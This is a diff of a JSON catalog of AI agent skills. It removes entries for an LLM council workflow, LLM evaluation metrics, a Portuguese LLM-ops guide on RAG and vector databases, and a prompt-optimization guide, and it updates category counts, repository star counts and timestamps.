accounts/fireworks/models/qwen3-235b-a22b | Alibaba |\n| Llama 4 Maverick | accounts/fireworks/models/llama4-maverick-instruct-basic | Meta |\n\n## Workflow\n\n### Step 1: Gather User Input\n\nUse AskUserQuestion to get:\n1. The query/question for the council (or accept it from the conversation)\n2. Which models to include (multiselect, recommend 3-5 models)\n3. Which model should be the Chairman (single select)\n\nNote: AskUserQuestion supports max 4 options per question. Since there are 7 models, split model selection across two questions, or show the most popular 4 and let the user type \"Other\" for the rest. A good default is to show 4 models in the first question and note the others are available via \"Other\". Rotate which models are shown based on variety.\n\nExample AskUserQuestion for model selection (show 4, mention others):\n```\nquestion: \"Which models should participate in the LLM Council? (Also available via Other: Llama 4 Maverick, Qwen3 235B, GLM 5)\"\nheader: \"Models\"\nmultiSelect: true\noptions:\n  - label: \"DeepSeek V3.2\"\n    description: \"DeepSeek's newest and most capable model\"\n  - label: \"MiniMax M2.1\"\n    description: \"MiniMax's strong open-weight model\"\n  - label: \"Kimi K2.5\"\n    description: \"Moonshot's strong open-weight model\"\n  - label: \"DeepSeek V3.1\"\n    description: \"DeepSeek's proven reasoning model\"\n```\n\nExample AskUserQuestion for chairman:\n```\nquestion: \"Which model should be the Chairman (synthesizes the final answer)?\"\nheader: \"Chairman\"\nmultiSelect: false\noptions:\n  - label: \"DeepSeek V3.2 (Recommended)\"\n    description: \"Newest DeepSeek, strong at comprehensive analysis\"\n  - label: \"GLM 5\"\n    description: \"Strong reasoning for synthesis\"\n  - label: \"Kimi K2.5\"\n    description: \"Strong at structured synthesis\"\n  - label: \"MiniMax M2.1\"\n    description: \"Strong open-weight model for synthesis\"\n```\n\n### Model Name to ID Mapping\n\nUse this mapping to convert user selections to Fireworks model IDs:\n\n```python\nMODEL_MAP = {\n    \"GLM 5\": \"accounts/fireworks/models/glm-5\",\n    \"DeepSeek V3.1\": \"accounts/fireworks/models/deepseek-v3p1\",\n    \"DeepSeek V3.2\": \"accounts/fireworks/models/deepseek-v3p2\",\n    \"MiniMax M2.1\": \"accounts/fireworks/models/minimax-m2p1\",\n    \"Kimi K2.5\": \"accounts/fireworks/models/kimi-k2p5\",\n    \"Qwen3 235B\": \"accounts/fireworks/models/qwen3-235b-a22b\",\n    \"Llama 4 Maverick\": \"accounts/fireworks/models/llama4-maverick-instruct-basic\",\n}\n```\n\n### Step 2: Run Phase 1 - Individual Responses\n\nAfter gathering input, run this script to get responses from all selected models in parallel:\n\n```bash\nQUERY=\"USER_QUERY_HERE\"\nMODELS='[\"accounts/fireworks/models/glm-5\", \"accounts/fireworks/models/deepseek-v3p1\"]'\n\npython3 << 'PY",
-      "tags": [
-        "python",
-        "api",
-        "claude",
-        "ai",
-        "agent",
-        "llm",
-        "workflow",
-        "document",
-        "cro"
-      ],
-      "useCases": [],
-      "scrapedAt": "2026-06-20T09:32:29.973Z"
-    },
-    {
-      "id": "antigravity-llm-evaluation",
-      "name": "llm-evaluation",
-      "slug": "llm-evaluation",
-      "description": "Master comprehensive evaluation strategies for LLM applications, from automated metrics to human evaluation and A/B testing.",
-      "category": "AI & Agents",
-      "source": "antigravity",
-      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
-      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/llm-evaluation",
-      "content": "\n# LLM Evaluation\n\nMaster comprehensive evaluation strategies for LLM applications, from automated metrics to human evaluation and A/B testing.\n\n## Do not use this skill when\n\n- The task is unrelated to llm evaluation\n- You need a different domain or tool outside this scope\n\n## Instructions\n\n- Clarify goals, constraints, and required inputs.\n- Apply relevant best practices and validate outcomes.\n- Provide actionable steps and verification.\n- If detailed examples are required, open `resources/implementation-playbook.md`.\n\n## Use this skill when\n\n- Measuring LLM application performance systematically\n- Comparing different models or prompts\n- Detecting performance regressions before deployment\n- Validating improvements from prompt changes\n- Building confidence in production systems\n- Establishing baselines and tracking progress over time\n- Debugging unexpected model behavior\n\n## Core Evaluation Types\n\n### 1. Automated Metrics\nFast, repeatable, scalable evaluation using computed scores.\n\n**Text Generation:**\n- **BLEU**: N-gram overlap (translation)\n- **ROUGE**: Recall-oriented (summarization)\n- **METEOR**: Semantic similarity\n- **BERTScore**: Embedding-based similarity\n- **Perplexity**: Language model confidence\n\n**Classification:**\n- **Accuracy**: Percentage correct\n- **Precision/Recall/F1**: Class-specific performance\n- **Confusion Matrix**: Error patterns\n- **AUC-ROC**: Ranking quality\n\n**Retrieval (RAG):**\n- **MRR**: Mean Reciprocal Rank\n- **NDCG**: Normalized Discounted Cumulative Gain\n- **Precision@K**: Relevant in top K\n- **Recall@K**: Coverage in top K\n\n### 2. Human Evaluation\nManual assessment for quality aspects difficult to automate.\n\n**Dimensions:**\n- **Accuracy**: Factual correctness\n- **Coherence**: Logical flow\n- **Relevance**: Answers the question\n- **Fluency**: Natural language quality\n- **Safety**: No harmful content\n- **Helpfulness**: Useful to the user\n\n### 3. LLM-as-Judge\nUse stronger LLMs to evaluate weaker model outputs.\n\n**Approaches:**\n- **Pointwise**: Score individual responses\n- **Pairwise**: Compare two responses\n- **Reference-based**: Compare to gold standard\n- **Reference-free**: Judge without ground truth\n\n## Quick Start\n\n```python\nfrom llm_eval import EvaluationSuite, Metric\n\n# Define evaluation suite\nsuite = EvaluationSuite([\n    Metric.accuracy(),\n    Metric.bleu(),\n    Metric.bertscore(),\n    Metric.custom(name=\"groundedness\", fn=check_groundedness)\n])\n\n# Prepare test cases\ntest_cases = [\n    {\n        \"input\": \"What is the capital of France?\",\n        \"expected\": \"Paris\",\n        \"context\": \"France is a country in Europe. Paris is its capital.\"\n    },\n    # ... more test cases\n]\n\n# Run evaluation\nresults = suite.evaluate(\n    model=your_model,\n    test_cases=test_cases\n)\n\nprint(f\"Overall Accuracy: {results.metrics['accuracy']}\")\nprint(f\"BLEU Score: {results.metrics['bleu']}\")\n```\n\n## Automated Metrics Implementation\n\n### BLEU Score\n```python\nfrom nltk.translate.bleu_score import sentence_bleu, SmoothingFunction\n\ndef calculate_bleu(reference, hypothesis):\n    \"\"\"Calculate BLEU score between reference and hypothesis.\"\"\"\n    smoothie = SmoothingFunction().method4\n\n    return sentence_bleu(\n        [reference.split()],\n        hypothesis.split(),\n        smoothing_function=smoothie\n    )\n\n# Usage\nbleu = calculate_bleu(\n    reference=\"The cat sat on the mat\",\n    hypothesis=\"A cat is sitting on the mat\"\n)\n```\n\n### ROUGE Score\n```python\nfrom rouge_score import rouge_scorer\n\ndef calculate_rouge(reference, hypothesis):\n    \"\"\"Calculate ROUGE scores.\"\"\"\n    scorer = rouge_scorer.RougeScorer(['rouge1', 'rouge2', 'rougeL'], use_stemmer=True)\n    scores = scorer.score(reference, hypothesis)\n\n    return {\n        'rouge1': scores['rouge1'].fmeasure,\n        'rouge2': scores['rouge2'].fmeasure,\n        'rougeL': scores['rougeL'].fmeasure\n    }\n```\n\n### BERTScore\n```python\nfrom bert_score import score\n\ndef calculate_bertscore(references, hypotheses):\n    \"\"\"Calculate BERTScore using pre-trained BERT.\"\"\"\n    P, R, F1 = score(\n        hypotheses,\n        references,\n        lang='en',\n        model_type='microsoft/deberta-xlarge-mnli'\n    )\n\n    return {\n        'precision': P.mean().item(),\n        'recall': R.mean().item(),\n        'f1': F1.mean().item()\n    }\n```\n\n### Custom Metrics\n```python\ndef calculate_groundedness(response, context):\n    \"\"\"Check if response is grounded in provided context.\"\"\"\n    # Use NLI model to check entailment\n    from transformers import pipeline\n\n    nli = pipeline(\"text-classification\", model=\"microsoft/deberta-large-mnli\")\n\n    result = nli(f\"{context} [SEP] {response}\")[0]\n\n    # Return confidence that response is entailed by context\n    return result['score'] if result['label'] == 'ENTAILMENT' else 0.0\n\ndef calculate_toxicity(text):\n    \"\"\"Measure toxicity in generated text.\"\"\"\n    from detoxify import Detoxify\n\n    results = Detoxify('original').predict(text)\n    return max(results.values())  # Return highest toxicity score\n\ndef calculate_factuality(claim",
-      "tags": [
-        "python",
-        "api",
-        "ai",
-        "llm",
-        "gpt",
-        "rag",
-        "cro"
-      ],
-      "useCases": [],
-      "scrapedAt": "2026-01-29T06:59:33.092Z"
-    },
-    {
-      "id": "antigravity-llm-ops",
-      "name": "llm-ops",
-      "slug": "llm-ops",
-      "description": "LLM Operations -- RAG, embeddings, vector databases, fine-tuning, prompt engineering avancado, custos de LLM, evals de qualidade e arquiteturas de IA para producao.",
-      "category": "AI & Agents",
-      "source": "antigravity",
-      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
-      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/llm-ops",
-      "content": "\n# LLM-OPS -- IA de Producao\n\n## Overview\n\nLLM Operations -- RAG, embeddings, vector databases, fine-tuning, prompt engineering avancado, custos de LLM, evals de qualidade e arquiteturas de IA para producao. Ativar para: implementar RAG, criar pipeline de embeddings, Pinecone/Chroma/pgvector, fine-tuning, prompt engineering, reducao de custos de LLM, evals, cache semantico, streaming, agents.\n\n## When to Use This Skill\n\n- When you need specialized assistance with this domain\n\n## Do Not Use This Skill When\n\n- The task is unrelated to llm ops\n- A simpler, more specific tool can handle the request\n- The user needs general-purpose assistance without domain expertise\n\n## How It Works\n\n> A diferenca entre um prototipo de IA e um produto de IA e operabilidade.\n> LLM-Ops e a engenharia que torna IA confiavel, escalavel e economica.\n\n---\n\n## Arquitetura Rag Completa\n\n[Documentos] -> [Chunking] -> [Embeddings] -> [Vector DB]\n                                                      |\n    [Query] -> [Embed query] -> [Semantic Search] -> [Top K chunks]\n                                                          |\n                                           [LLM + Context] -> [Resposta]\n\n## Pipeline De Indexacao\n\nfrom anthropic import Anthropic\n    import chromadb\n\n    client = Anthropic()\n    chroma = chromadb.PersistentClient(path=\"./chroma_db\")\n\n    def chunk_text(text, chunk_size=500, overlap=50):\n        words = text.split()\n        chunks = []\n        for i in range(0, len(words), chunk_size - overlap):\n            chunk = \" \".join(words[i:i + chunk_size])\n            if chunk: chunks.append(chunk)\n        return chunks\n\n    def index_document(doc_id, content_text, metadata=None):\n        chunks = chunk_text(content_text)\n        ids = [f\"{doc_id}_chunk_{i}\" for i in range(len(chunks))]\n        collection.upsert(ids=ids, documents=chunks)\n        return len(chunks)\n\n## Pipeline De Query Com Rag\n\ndef rag_query(query, top_k=5, system=None):\n        results = collection.query(\n            query_texts=[query], n_results=top_k,\n            include=[\"documents\", \"metadatas\", \"distances\"])\n        context_parts = []\n        for doc, meta, dist in zip(results[\"documents\"][0],\n                                    results[\"metadatas\"][0],\n                                    results[\"distances\"][0]):\n            if dist < 1.5:\n                src = meta.get(\"source\", \"doc\")\n                context_parts.append(f\"[Fonte: {src}]\n{doc}\")\n        context = \"\n\n---\n\n\".join(context_parts)\n        response = client.messages.create(\n            model=\"claude-opus-4-20250805\", max_tokens=1024,\n            system=system or \"Responda baseado no contexto.\",\n            messages=[{\"role\": \"user\", \"content\": f\"Contexto:\n{context}\n\n{query}\"}])\n        return response.content[0].text\n\n---\n\n## Escolha Do Vector Db\n\n| DB | Melhor Para | Hosting | Custo |\n|----|------------|---------|-------|\n| Chroma | Desenvolvimento, local | Self-hosted | Gratis |\n| pgvector | Ja usa PostgreSQL | Self/Cloud | Gratis |\n| Pinecone | Producao gerenciada | Cloud | USD 70+/mes |\n| Weaviate | Multi-modal | Self/Cloud | Gratis+ |\n| Qdrant | Alta performance | Self/Cloud | Gratis+ |\n\n## Pgvector\n\nCREATE EXTENSION IF NOT EXISTS vector;\n    CREATE TABLE knowledge_embeddings (\n        id UUID PRIMARY KEY DEFAULT gen_random_uuid(),\n        content TEXT NOT NULL,\n        embedding vector(1536),\n        metadata JSONB,\n        created_at TIMESTAMPTZ DEFAULT NOW()\n    );\n    CREATE INDEX ON knowledge_embeddings\n    USING ivfflat (embedding vector_cosine_ops) WITH (lists = 100);\n    SELECT content, 1 - (embedding <=> QUERY_VECTOR) AS similarity\n    FROM knowledge_embeddings ORDER BY similarity DESC LIMIT 5;\n\n---\n\n## Estrutura De Prompt De Elite\n\nComponentes do system prompt Auri:\n\n- Identidade: Nome (Auri), Tom (Natural, caloroso, direto), Plataforma (Amazon Alexa)\n- Regras: Maximo 3 paragrafos curtos, sem markdown, linguagem conversacional\n- Capacidades: analise de negocios, conselho baseado em dados, criatividade\n- Limitacoes: sem internet tempo real, sem transacoes financeiras\n- Personalizacao: {user_name}, {user_preferences}, {relevant_history}\n\n## Chain-Of-Thought\n\ndef cot_analysis(problem: str) -> str:\n        steps = [\n            \"1. O que exatamente esta sendo pedido?\",\n            \"2. Que informacoes sao criticas para resolver?\",\n            \"3. Quais abordagens possiveis existem?\",\n            \"4. Qual abordagem e melhor e por que?\",\n            \"5. Quais riscos ou limitacoes existem?\",\n        ]\n        prompt = f\"Analise passo a passo:\n\nPROBLEMA: {problem}\n\n\"\n        prompt += \"\n\".join(steps) + \"\n\nResposta final (concisa, para voz):\"\n        return call_claude(prompt)\n\n---\n\n## Cache Semantico\n\nclass SemanticCache:\n        def __init__(self, similarity_threshold=0.95):\n            self.threshold = similarity_threshold\n            self.cache = {}\n\n        def get_cached(self, query, embedding):\n            for cached_emb, (response, _) in self.cache.items():\n            ",
-      "tags": [
-        "markdown",
-        "claude",
-        "ai",
-        "agent",
-        "llm",
-        "document",
-        "rag"
-      ],
-      "useCases": [
-        "When you need specialized assistance with this domain"
-      ],
-      "scrapedAt": "2026-03-08T06:57:06.555Z"
-    },
-    {
-      "id": "antigravity-llm-prompt-optimizer",
-      "name": "llm-prompt-optimizer",
-      "slug": "llm-prompt-optimizer",
-      "description": "Use when improving prompts for any LLM. Applies proven prompt engineering techniques to boost output quality, reduce hallucinations, and cut token usage.",
-      "category": "AI & Agents",
-      "source": "antigravity",
-      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
-      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/llm-prompt-optimizer",
-      "content": "\n# LLM Prompt Optimizer\n\n## Overview\n\nThis skill transforms weak, vague, or inconsistent prompts into precision-engineered instructions that reliably produce high-quality outputs from any LLM (Claude, Gemini, GPT-4, Llama, etc.). It applies systematic prompt engineering frameworks — from zero-shot to few-shot, chain-of-thought, and structured output patterns.\n\n## When to Use This Skill\n\n- Use when a prompt returns inconsistent, vague, or hallucinated results\n- Use when you need structured/JSON output from an LLM reliably\n- Use when designing system prompts for AI agents or chatbots\n- Use when you want to reduce token usage without sacrificing quality\n- Use when implementing chain-of-thought reasoning for complex tasks\n- Use when prompts work on one model but fail on another\n\n## Step-by-Step Guide\n\n### 1. Diagnose the Weak Prompt\n\nBefore optimizing, identify which problem pattern applies:\n\n| Problem | Symptom | Fix |\n|---------|---------|-----|\n| Too vague | Generic, unhelpful answers | Add role + context + constraints |\n| No structure | Unformatted, hard-to-parse output | Specify output format explicitly |\n| Hallucination | Confident wrong answers | Add \"say I don't know if unsure\" |\n| Inconsistent | Different answers each run | Add few-shot examples |\n| Too long | Verbose, padded responses | Add length constraints |\n\n### 2. Apply the RSCIT Framework\n\nEvery optimized prompt should have:\n\n- **R** — **Role**: Who is the AI in this interaction?\n- **S** — **Situation**: What context does it need?\n- **C** — **Constraints**: What are the rules and limits?\n- **I** — **Instructions**: What exactly should it do?\n- **T** — **Template**: What should the output look like?\n\n**Before (weak prompt):**\n```\nExplain machine learning.\n```\n\n**After (optimized prompt):**\n```\nYou are a senior ML engineer explaining concepts to a junior developer.\n\nContext: The developer has 1 year of Python experience but no ML background.\n\nTask: Explain supervised machine learning in simple terms.\n\nConstraints:\n- Use an analogy from everyday life\n- Maximum 200 words\n- No mathematical formulas\n- End with one actionable next step\n\nFormat: Plain prose, no bullet points.\n```\n\n### 3. Chain-of-Thought (CoT) Pattern\n\nFor reasoning tasks, instruct the model to think step-by-step:\n\n```\nSolve this problem step by step, showing your work at each stage.\nOnly provide the final answer after completing all reasoning steps.\n\nProblem: [your problem here]\n\nThinking process:\nStep 1: [identify what's given]\nStep 2: [identify what's needed]\nStep 3: [apply logic or formula]\nStep 4: [verify the answer]\n\nFinal Answer:\n```\n\n### 4. Few-Shot Examples Pattern\n\nProvide 2-3 examples to establish the pattern:\n\n```\nClassify the sentiment of customer reviews as POSITIVE, NEGATIVE, or NEUTRAL.\n\nExamples:\nReview: \"This product exceeded my expectations!\" -> POSITIVE\nReview: \"It arrived broken and support was useless.\" -> NEGATIVE  \nReview: \"Product works as described, nothing special.\" -> NEUTRAL\n\nNow classify:\nReview: \"[your review here]\" ->\n```\n\n### 5. Structured JSON Output Pattern\n\n```\nExtract the following information from the text below and return it as valid JSON only.\nDo not include any explanation or markdown — just the raw JSON object.\n\nSchema:\n{\n  \"name\": string,\n  \"email\": string | null,\n  \"company\": string | null,\n  \"role\": string | null\n}\n\nText: [input text here]\n```\n\n### 6. Reduce Hallucination Pattern\n\n```\nAnswer the following question based ONLY on the provided context.\nIf the answer is not contained in the context, respond with exactly: \"I don't have enough information to answer this.\"\nDo not make up or infer information not present in the context.\n\nContext:\n[your context here]\n\nQuestion: [your question here]\n```\n\n### 7. Prompt Compression Techniques\n\nReduce token count without losing effectiveness:\n\n```\n# Verbose (expensive)\n\"Please carefully analyze the following code and provide a detailed explanation of \nwhat it does, how it works, and any potential issues you might find.\"\n\n# Compressed (efficient, same quality)\n\"Analyze this code: explain what it does, how it works, and flag any issues.\"\n```\n\n## Best Practices\n\n- ✅ **Do:** Always specify the output format (JSON, markdown, plain text, bullet list)\n- ✅ **Do:** Use delimiters (```, ---) to separate instructions from content\n- ✅ **Do:** Test prompts with edge cases (empty input, unusual data)\n- ✅ **Do:** Version your system prompts in source control\n- ✅ **Do:** Add \"think step by step\" for math, logic, or multi-step tasks\n- ❌ **Don't:** Use negative-only instructions (\"don't be verbose\") — add positive alternatives\n- ❌ **Don't:** Assume the model knows your codebase context — always include it\n- ❌ **Don't:** Use the same prompt across different models without testing — they behave differently\n\n## Prompt Audit Checklist\n\nBefore using a prompt in production:\n\n- [ ] Does it have a clear role/persona?\n- [ ] Is the output format explicitly defined?\n- [ ] Are edge cases handled (empty input, ambiguous data)?\n- [ ] Is",
-      "tags": [
-        "python",
-        "markdown",
-        "claude",
-        "ai",
-        "agent",
-        "llm",
-        "gpt",
-        "template",
-        "design",
-        "cro"
-      ],
-      "useCases": [
-        "Use when a prompt returns inconsistent, vague, or hallucinated results",
-        "Use when you need structured/JSON output from an LLM reliably",
-        "Use when designing system prompts for AI agents or chatbots",
-        "Use when you want to reduce token usage without sacrificing quality",
-        "Use when implementing chain-of-thought reasoning for complex tasks"
-      ],
-      "scrapedAt": "2026-03-05T07:05:22.089Z"
-    },
-    {
       "id": "antigravity-agent-squad-luna",
       "name": "luna",
       "slug": "agent-squad-luna",
@@ -27966,35 +27996,35 @@
       "name": "Document Processing",
       "description": "Create, edit, and analyze documents including Word, PDF, PowerPoint, and Excel files.",
       "icon": "file-text",
-      "count": 381
+      "count": 384
     },
     {
       "id": "ai-agents",
       "name": "AI & Agents",
       "description": "AI agent development, memory systems, and autonomous workflows.",
       "icon": "bot",
-      "count": 359
+      "count": 357
     },
     {
       "id": "creative-media",
       "name": "Creative & Media",
       "description": "Design, image editing, video processing, and creative content generation.",
       "icon": "palette",
-      "count": 147
+      "count": 146
     },
     {
       "id": "development-code-tools",
       "name": "Development & Code Tools",
       "description": "Tools for building, testing, and deploying software with AI assistance.",
       "icon": "code",
-      "count": 132
+      "count": 133
     },
     {
       "id": "security-systems",
       "name": "Security & Systems",
       "description": "Security analysis, system administration, and forensics.",
       "icon": "shield",
-      "count": 67
+      "count": 66
     },
     {
       "id": "business-marketing",
@@ -28038,48 +28068,48 @@
       "url": "https://github.com/obra/superpowers",
       "skillCount": 14,
       "newSkillCount": 0,
-      "stars": 247379
+      "stars": 248197
     },
     {
       "name": "Anthropic",
       "url": "https://github.com/anthropics/skills",
       "skillCount": 15,
       "newSkillCount": 2,
-      "stars": 158610
+      "stars": 159019
     },
     {
       "name": "ComposioHQ",
       "url": "https://github.com/ComposioHQ/awesome-claude-skills",
       "skillCount": 19,
       "newSkillCount": 8,
-      "stars": 66949
+      "stars": 67042
     },
     {
       "name": "OpenHands",
       "url": "https://github.com/OpenHands/OpenHands",
       "skillCount": 24,
       "newSkillCount": 2,
-      "stars": 79588
+      "stars": 79713
     },
     {
       "name": "Awesome LLM",
       "url": "https://github.com/Prat011/awesome-llm-skills",
       "skillCount": 26,
       "newSkillCount": 0,
-      "stars": 1371
+      "stars": 1374
     },
     {
       "name": "Antigravity",
       "url": "https://github.com/sickn33/antigravity-awesome-skills",
       "skillCount": 1060,
-      "newSkillCount": 6,
-      "stars": 42431
+      "newSkillCount": 21,
+      "stars": 42509
     }
   ],
-  "lastUpdated": "2026-07-06T10:59:33.748Z",
+  "lastUpdated": "2026-07-07T09:58:39.706Z",
   "stats": {
     "totalSkills": 1158,
-    "newSkills": 18,
-    "scrapedAt": "2026-07-06T10:59:33.748Z"
+    "newSkills": 33,
+    "scrapedAt": "2026-07-07T09:58:39.706Z"
   }
 }
